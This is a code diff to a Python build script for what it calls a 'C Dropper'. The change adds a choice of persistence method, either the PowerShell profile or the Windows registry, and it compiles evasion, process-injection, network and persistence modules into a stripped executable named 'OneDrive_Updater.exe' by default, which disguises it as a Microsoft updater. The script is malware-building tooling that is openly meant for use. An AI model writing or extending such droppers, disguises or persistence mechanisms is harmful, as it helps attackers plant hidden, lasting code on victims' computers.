@@ -15,9 +15,14 @@ def get_sha256(filepath):
 parser = argparse.ArgumentParser(description="Builder and Mutator for the C Dropper")
 parser.add_argument("--name", type=str, default="OneDrive_Updater.exe", help="Name of the final generated executable")
 parser.add_argument("--debug", action="store_true", help="Compile in debug mode (shows the terminal window)")
+parser.add_argument("--persistence", type=str, choices=["ps", "reg"], default="reg", help="Select persistence method: PowerShell Profile (ps) or Windows Registry (reg)")
 args = parser.parse_args()
 
 print("[*] 1. Compiling C code...")
+
+#select file based on arg
+persistence_file = "persistence_ps.c" if args.persistence == "ps" else "persistence_reg.c"
+print(f"[*] Persistence Module Selected: {persistence_file}")
 
 # get absolute paths
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -38,7 +43,7 @@ compile_cmd = [
     os.path.join(code_dir, "evasion.c"),
     os.path.join(code_dir, "injection.c"),
     os.path.join(code_dir, "network.c"),
-    os.path.join(code_dir, "persistence.c"),
+    os.path.join(code_dir, persistence_file),
     os.path.join(code_dir, "main.c"),
     "-o", compiled_exe,
     "-s"           # stripped flag
